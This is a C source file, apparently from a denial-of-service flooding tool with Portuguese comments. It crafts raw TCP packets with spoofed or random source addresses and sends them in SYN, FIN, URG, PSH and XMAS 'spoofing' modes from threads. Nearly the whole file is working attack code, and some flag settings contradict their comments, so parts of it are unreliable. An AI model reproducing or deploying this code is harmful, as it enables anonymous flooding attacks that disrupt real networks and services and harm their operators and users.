#include "raw_socket.h"
#include "validate.h"

pthread_mutex_t morfo = PTHREAD_MUTEX_INITIALIZER;

in_addr_t RandomIp() 
{
	return rand()%0xffffffff + 0x1;
}
     
//function from my Brother I4K the master of wizards
//from Orion-Socket API
int orion_getHostByName(const char* name, char* buffer)
{
	struct addrinfo hints, * res, * res0 = NULL;	
	struct sockaddr_in * target = NULL;	
	int error;
	char *tmp = NULL;
    
	memset(&hints, 0, sizeof(struct addrinfo));
    
	hints.ai_family = PF_UNSPEC;
	hints.ai_socktype = 0;
	error = getaddrinfo(name, "http", &hints, &res0);
    
	if(error)
	{
		if (res0)
            		freeaddrinfo(res0);
        	return 1;
    	}
    
    	for (res = res0; res; res = res->ai_next)
    	{
        	target = (struct sockaddr_in *) res->ai_addr;

   	     	if (target)
        	{
	            tmp = inet_ntoa(target->sin_addr);
	            if (tmp && strlen(tmp))
	            {
	                strncpy(buffer, tmp, strlen(tmp));
	                buffer[strlen(tmp)] = '\0';

	                if (res0)
	                    freeaddrinfo(res0);
	                return 1;
            	    }
        	}
    	}
    
    freeaddrinfo(res0);
    
    return 0;
}

void *fazerpacote(void *arg)
{
 char *source_addr,*dest_addr; 
 unsigned short dest_port,ran_port; 
 int escolha;

// Unpack args
 char **arguments = (char **)arg;
 source_addr=arguments[0];
 dest_addr=arguments[1];
 dest_port=atoi(arguments[2]);
 ran_port=atoi(arguments[3]);
 escolha=atoi(arguments[4]);
/////

 struct envio {    
  struct iphdr ip;    
  struct tcphdr tcp;    
 } envio;    

 struct pseudo_header {    
  unsigned int source_address;    
  unsigned int dest_address;    
  unsigned char placeholder;    
  unsigned char protocol;    
  unsigned short tcp_length;    
  struct tcphdr tcp;    
 } pseudo_header;
    
 int tcp_socket;   
 int sinlen;  
 struct sockaddr_in sin; 
 unsigned int remetente,destino;

// string 2 int
// if ipv6 AF_INET6
 inet_pton(AF_INET, source_addr, &remetente);
 inet_pton(AF_INET, dest_addr, &destino);
         
//setamos variaveis do pacote ip   
 envio.ip.ihl = 5;    
 envio.ip.version = 4;    
 envio.ip.tos = 0;    
 envio.ip.tot_len = htons(40);    
 envio.ip.id = ran_port;    
 envio.ip.frag_off = 0;    
 envio.ip.ttl = 255;    
 envio.ip.protocol = IPPROTO_TCP;    
 envio.ip.check = 0;    
 envio.ip.saddr = remetente;    
 envio.ip.daddr = destino;    
        
//setamos variaveis do pacote TCP    
 envio.tcp.source = ran_port;    
 envio.tcp.dest = htons(dest_port);    
 envio.tcp.seq = ran_port;          
 envio.tcp.res1 = 0;
 envio.tcp.res2 = 0;     
 envio.tcp.doff = 5;    
 envio.tcp.ack = 0; 
 envio.tcp.ack_seq = 0;    
 envio.tcp.urg_ptr = 0;        
 envio.tcp.window = htons(512);    
 envio.tcp.check = 0;    

// lock
 pthread_mutex_lock(&morfo);

  switch(escolha)
  {
// XMAS with Spoofing
    case 0:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 1;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;

// SYN with Spoofing
    case 1:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// SYN with Mirror Spoofing
    case 2:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// FIN with spoofing
    case 3:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

//FIN with Mirror Spoofing
    case 4:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// URG ...
    case 5:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;

    case 6:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 0;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;
// PSH ...
    case 7:
     envio.tcp.fin = 0;    
     envio.tcp.syn = 0;    
     envio.tcp.rst = 0;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 0;  
     envio.tcp.ack = 1; 
     break;

// XMAS with mirror
    case 8:
     envio.tcp.fin = 1;    
     envio.tcp.syn = 1;    
     envio.tcp.rst = 1;    
     envio.tcp.psh = 1;  
     envio.tcp.urg = 1;  
     envio.tcp.ack = 1; 
     break;
  }
            
  sin.sin_family = AF_INET;    
  sin.sin_port = envio.tcp.source;    
  sin.sin_addr.s_addr = envio.ip.daddr;       
        
// abrimos a socket   
  tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    

  if(tcp_socket < 0) 
   DEBUG("error in socket()"); 
        
// setamos os campos que precisão ser mudados   
  envio.tcp.source++;    
  envio.ip.id++;    
  envio.tcp.seq++;    
  envio.tcp.check = 0;    
  envio.ip.check = 0;    
           
// checksum   
  envio.ip.check = in_cksum((unsigned short *)&envio.ip, 20); //20    
     
// setamos campo dos cabeçalhos  
  pseudo_header.source_address = envio.ip.saddr;    
  pseudo_header.dest_address = envio.ip.daddr;    
  pseudo_header.placeholder = 0;    
  pseudo_header.protocol = IPPROTO_TCP;    
  pseudo_header.tcp_length = htons(20);    

  bcopy((char *)&envio.tcp, (char *)&pseudo_header.tcp, 20); //20  
  envio.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32); //32    
  sinlen = sizeof(sin);   

  sendto(tcp_socket, &envio, 40, 0, (struct sockaddr *)&sin, sinlen);  
  close(tcp_socket);   
 
 pthread_mutex_unlock(&morfo);
 pthread_exit(NULL);
}    
